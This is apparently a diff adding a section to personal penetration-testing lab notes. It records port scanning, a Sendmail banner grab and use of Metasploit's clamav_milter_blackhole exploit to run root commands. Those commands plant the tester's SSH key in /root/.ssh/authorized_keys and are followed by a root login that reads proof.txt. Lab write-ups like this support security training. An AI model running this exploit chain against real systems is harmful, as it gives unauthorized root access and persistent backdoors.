@@ -999,5 +999,229 @@ count: 1
 NO reverse shell created
 
 
+# Metasploit
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ rustscan -a 192.168.177.42 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+😵 https://admin.tryhackme.com
+
+[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 192.168.177.42:22
+Open 192.168.177.42:25
+Open 192.168.177.42:80
+Open 192.168.177.42:139
+Open 192.168.177.42:199
+Open 192.168.177.42:445
+Open 192.168.177.42:60000
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-31 23:41 EST
+Initiating Ping Scan at 23:41
+Scanning 192.168.177.42 [2 ports]
+Completed Ping Scan at 23:41, 0.27s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 23:41
+Completed Parallel DNS resolution of 1 host. at 23:41, 0.02s elapsed
+DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 23:41
+Scanning 192.168.177.42 [7 ports]
+Discovered open port 139/tcp on 192.168.177.42
+Discovered open port 22/tcp on 192.168.177.42
+Discovered open port 25/tcp on 192.168.177.42
+Discovered open port 445/tcp on 192.168.177.42
+Discovered open port 199/tcp on 192.168.177.42
+Discovered open port 80/tcp on 192.168.177.42
+Discovered open port 60000/tcp on 192.168.177.42
+Completed Connect Scan at 23:41, 0.25s elapsed (7 total ports)
+Nmap scan report for 192.168.177.42
+Host is up, received syn-ack (0.25s latency).
+Scanned at 2022-01-31 23:41:32 EST for 0s
+
+PORT      STATE SERVICE      REASON
+22/tcp    open  ssh          syn-ack
+25/tcp    open  smtp         syn-ack
+80/tcp    open  http         syn-ack
+139/tcp   open  netbios-ssn  syn-ack
+199/tcp   open  smux         syn-ack
+445/tcp   open  microsoft-ds syn-ack
+60000/tcp open  unknown      syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
+
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ 
+
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ telnet 192.168.177.42 25                                                                                                                                        1 ⨯
+Trying 192.168.177.42...
+Connected to 192.168.177.42.
+Escape character is '^]'.
+220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Tue, 1 Feb 2022 04:41:03 -0500; (No UCE/UBE) logging access from: [192.168.49.177](FAIL)-[192.168.49.177]
+^Cexit
+^]
+telnet> quit
+Connection closed.
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ 
+```
+
+```
+msf5 exploit(unix/smtp/clamav_milter_blackhole) > set CMD 'echo "hello" > /var/www/test.html'
+CMD => echo "hello" > /var/www/test.html
+msf5 exploit(unix/smtp/clamav_milter_blackhole) > run
+[*] Exploit completed, but no session was created.
+msf5 exploit(unix/smtp/clamav_milter_blackhole) > show options
+
+Module options (exploit/unix/smtp/clamav_milter_blackhole):
+
+   Name      Current Setting     Required  Description
+   ----      ---------------     --------  -----------
+   MAILFROM  sender@example.com  yes       FROM address of the e-mail
+   MAILTO    nobody@localhost    yes       TO address of the e-mail
+   RHOSTS    192.168.177.42      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT     25                  yes       The target port (TCP)
+
+
+Payload options (cmd/unix/generic):
+
+   Name  Current Setting                    Required  Description
+   ----  ---------------                    --------  -----------
+   CMD   echo "hello" > /var/www/test.html  yes       The command string to execute
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(unix/smtp/clamav_milter_blackhole) > 
+```
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ curl http://192.168.177.42/                                                                                                                                   130 ⨯
+<html>
+<head><title>Ph33r</title></head>
+<body>
+<center>
+<p></p>
+<p>01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 0011
+0000 01100010
+</p>
+</center>
+</body>
+</html>
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ curl http://192.168.177.42/test
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<HTML><HEAD>
+<TITLE>404 Not Found</TITLE>
+</HEAD><BODY>
+<H1>Not Found</H1>
+The requested URL /test was not found on this server.<P>
+<HR>
+<ADDRESS>Apache/1.3.33 Server at 192.168.177.42 Port 80</ADDRESS>
+</BODY></HTML>
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ curl http://192.168.177.42/test
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<HTML><HEAD>
+<TITLE>404 Not Found</TITLE>
+</HEAD><BODY>
+<H1>Not Found</H1>
+The requested URL /test was not found on this server.<P>
+<HR>
+<ADDRESS>Apache/1.3.33 Server at 192.168.177.42 Port 80</ADDRESS>
+</BODY></HTML>
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ sudo python3 -m http.server 80  
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ curl http://192.168.177.42/test
+hello
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ 
+```
+
+## SSH
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ cat ~/.ssh/id_rsa.pub      
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali
+                                                                                                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ 
+```
+
+```
+msf5 exploit(unix/smtp/clamav_milter_blackhole) > set CMD 'mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali" > /root/.ssh/authorized_keys'
+CMD => mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali" > /root/.ssh/authorized_keys
+msf5 exploit(unix/smtp/clamav_milter_blackhole) > run
+[*] Exploit completed, but no session was created.
+msf5 exploit(unix/smtp/clamav_milter_blackhole) > 
+```
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ ssh -i ~/.ssh/id_rsa root@192.168.177.42 -oKexAlgorithms=+diffie-hellman-group1-sha1                                                                          255 ⨯
+The authenticity of host '192.168.177.42 (192.168.177.42)' can't be established.
+RSA key fingerprint is SHA256:Vk92TR+v6+ZF1BSflZ65yVDMRBNhru5JJEAq2k8dG7g.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.177.42' (RSA) to the list of known hosts.
+Last login: Fri Jul  3 14:02:37 2020
+0xbabe:~# cat proof.txt
+285e748f6c989154625817e3cbae597c
+0xbabe:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:BF:F2:F6  
+          inet addr:192.168.177.42  Bcast:192.168.177.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:febf:f2f6/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:131985 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:131950 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:10303317 (9.8 MiB)  TX bytes:7933413 (7.5 MiB)
+          Base address:0x2000 Memory:fd5c0000-fd5e0000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:4 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:264 (264.0 b)  TX bytes:264 (264.0 b)
+
+0xbabe:~# 
+
+```
+
+![](Pasted%20image%2020220201125054.png)
 
 # Others
